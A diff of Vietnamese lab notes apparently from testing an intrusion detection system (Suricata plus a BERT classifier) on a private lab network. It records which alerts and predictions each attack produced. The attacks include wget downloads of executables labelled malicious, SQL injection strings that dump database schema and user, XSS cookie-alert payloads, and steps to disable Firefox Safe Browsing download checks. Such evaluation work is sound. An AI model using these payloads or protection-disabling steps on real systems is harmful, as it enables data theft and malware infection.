@@ -141,12 +141,14 @@ chú ý 2 sự kiện là "fileinfo" và "http". còn để phát hiện các cu
                     + wget http://192.168.189.135/downloads/demo.exe
                     + wget http://192.168.189.135/downloads/yourfile.txt
                     + wget http://192.168.189.135/downloads/install.exe
-                    + wget http://192.168.189.135/downloads/network.dll
                     + wget http://192.168.189.135/downloads/notepad.exe
                     + wget http://192.168.189.135/downloads/project.exe
                     + wget http://192.168.189.135/downloads/simulator.exe
                     + wget http://192.168.189.135/downloads/tool.exe
                     + wget http://192.168.189.135/downloads/toolkit.exe
+
+demo tải 3 file (2 file mã độc và 1 file an toàn)
+ wget http://192.168.189.135/downloads/demo.exe && wget http://192.168.189.135/downloads/yourfile.txt && wget http://192.168.189.135/downloads/install.exe
 - chạy 2 file thực thi đẻ thu thập log đồng thời trên cả 2 công cụ
 
 =================
@@ -166,19 +168,76 @@ chú ý 2 sự kiện là "fileinfo" và "http". còn để phát hiện các cu
 + sudo pkill -f "suricata -c /etc/suricata/suricata.yaml -i ens33"
 + sudo pkill -f "/usr/bin/python3 /usr/local/bin/cicflowmeter -i ens33 -c --dir /home/william/Desktop/cici_client/data/new"
 ====================================================================================
-- khi tải file về nó sẽ dự đoán ra: unknown attack,vào checkfile, có alert
+- khi tải file về nó sẽ dự đoán ra:
++ tất cả flow liên quan đến tải file là : unknown attack,vào checkfile, có alert
+(tất cả đều có alert, trừ flow liên quan đến file an toàn là yourfile.txt là ko có alert )
++ Gồm có 2 alert
+      + Signature:ET INFO Executable Download from dotted-quad Host,  Category: Potentially Bad Traffic, Severity:	2, Signature ID:2016141
+      + Signature:ET INFO Wget Request for Executable,  Category: Potentially Bad Traffic, Severity:	2, Signature ID:2027076
 -tấn công dos đang ra : unknown attack
-- bruce force: dự đoán đúng, ko có alert
-- port scan: dự đoán ra Unknown attack nhiều, vẫn dự đoán ra port scan. Nếu dùng lệnh nmap thì có nhiều alert
-- FTP: ra unknown attack hết, có alert
-- truy cập internet: có nhiều BENIGN, vân có ít unknown attack
-- sql injection
-+ get search: lam' union select 1,user(), database(),4,5,6,7 #  : ra unknown attack, bert ra đúng, có alert
-+ get select: http://192.168.189.133:8080/sqli_2.php?movie=1 and 1=0 union all select 1,database(),3,4,5,6,7--&action=go  : 
-ra unknown attack, bert ra đúng  (1 bert ra ssh, 1 bert ra đúng)
-+ sql injection(AJAX\JSON\jQuery): uyen ' union select 1, user(),3,4,5,6,7 # : ra unknown attack, bert ra đúng (1 bert ra ssh, 
-1 bert ra đúng), có alert
-- xss: 
-+ get: <script>alert(document.cookie)</script>     ra unknown attack, bert ra đúng, có alert
-+ post: <script>alert(document.cookie)</script>    ra unknown attack, bert ra sai (ra normal hết), ko có alert
-+ json: "\"}]}';alert(document.cookie)</script>"   ra unknown attack, bert (sql, xss), có alert
+- bruce force (20s):
++  dự đoán ra cả unknown attack và bruce force
++ có alert
+      + Signature:ET SCAN Potential SSH Scan,  Category: Attempted Information Leak, Severity:	2, Signature ID:2001219
+
+- port scan (25s):
++ hầu hết dự đoán ra port scan.1 phần rất ít ra unknown attack
++ có alert
+    + Signature: ET SCAN Suspicious inbound to mySQL port 3306  Category: Potentially Bad Traffic, Severity:2, Signature ID: 2010937
+
+- FTP: ra unknown attack hết
++ có alert
+    + Signature: GPL FTP PASS overflow attempt ,Category: Attempted Administrator Privilege Gain
+
+- truy cập internet: phần lớn là BENIGN, có 1 số rất ít ra unknown attack
+
+1.sql injection
+1.1. get search:
+      - dùng các lệnh sau:
+         - nhóm 1 : + "lam' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #"
+                    + "lam' union select 1,user(), database(),4,5,6,7 #"
+                    -> kết quả: tất cả đều ra dự đoán là unknown attack, bert ra đúng hết
+                            - các alert
+                            + Signature: ET WEB_SERVER ATTACKER SQLi - SELECT and Schema Columns M1,  Category: Attempted User Privilege Gain
+                            + Signature: ET WEB_SERVER Possible MySQL SQLi Attempt Information Schema Access, Category:Web Application Attack
+                            +Signature: 	ET WEB_SERVER SELECT USER SQL Injection Attempt in URI,  Category:Web Application Attack
+         - nhóm 2 : + "lam' GROUP BY login-- -"
+                    + "lam' GROUP BY user-- -"
+                    -> kết quả: dự đoán ra begign, nhưng bert lại ra là sql injection
+1.2 get select:
+      - dùng các lệnh sau
+        - nhóm 1: + "http://192.168.189.133:8080/sqli_2.php?movie=100 union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #&action=go",
+            -> dự đoán ra unknown attack, bert ra đúng
+                - các alert
+                + Signature: ET WEB_SERVER ATTACKER SQLi - SELECT and Schema Columns M1,  Category: Attempted User Privilege Gain
+                + Signature: ET WEB_SERVER Possible MySQL SQLi Attempt Information Schema Access, Category:Web Application Attack
+         - nhơm 2:+ "http://192.168.189.133:8080/sqli_2.php?movie=100 union select 1, 2,3,4,5,6,7 #&action=go"
+            -> dự đoán ra begign và bert ra sql injection
+2. xss: 
+2.1.  get:
+      - dùng các lệnh sau
+          +  "<script>alert(document.cookie)</script>"
+          +  "<img src=\"#\" onmouseover=\"alert('XSS via onmouseover')\">"
+          +  "<h1 style=\"color: red;\">Hacked by XSS</h1>",
+            -> tất cả dự đoán đều ra unknown attack, bert ra xss hết
+                - các alert
+                + Signature: ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
+                + Signature: ET WEB_SERVER Onmouseover= in URI - Likely Cross Site Scripting Attempt
+
+2.2. (bỏ) post: <script>alert(document.cookie)</script>    ra unknown attack, bert ra sai (ra normal hết)
+2.3.  json:
+        +  "\"}]}';alert(document.cookie)</script>"
+         ->  dự đoán ra unknown attack, bert ra xss 
+            -   có alert: ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
+================= tắt kiểm tra tính năng kiểm tra file trên firefox
+- Cách tắt kiểm tra tệp trong Firefox:
+
++ Trên thanh địa chỉ, nhập about:config và nhấn Enter.
++ Nhấp vào Accept the Risk and Continue.
++ Tìm cài đặt browser.safebrowsing.downloads.enabled bằng cách nhập vào ô tìm kiếm ở đầu trang. Nhấp đúp vào kết quả để 
+thay đổi giá trị từ true sang false. Điều này sẽ tắt tính năng kiểm tra tải xuống của Firefox.
+
+- Tắt Safe Browsing (Không khuyến khích, nhưng giúp tránh cảnh báo tải xuống):
++ browser.safebrowsing.malware.enabled
++ browser.safebrowsing.phishing.enabled . Đối với mỗi cài đặt, nhấp đúp để chuyển từ true sang false.
+ Điều này sẽ tắt tính năng duyệt web an toàn, bao gồm cả việc chặn các trang web có nguy cơ gây hại và cảnh báo về tải xuống độc hại.
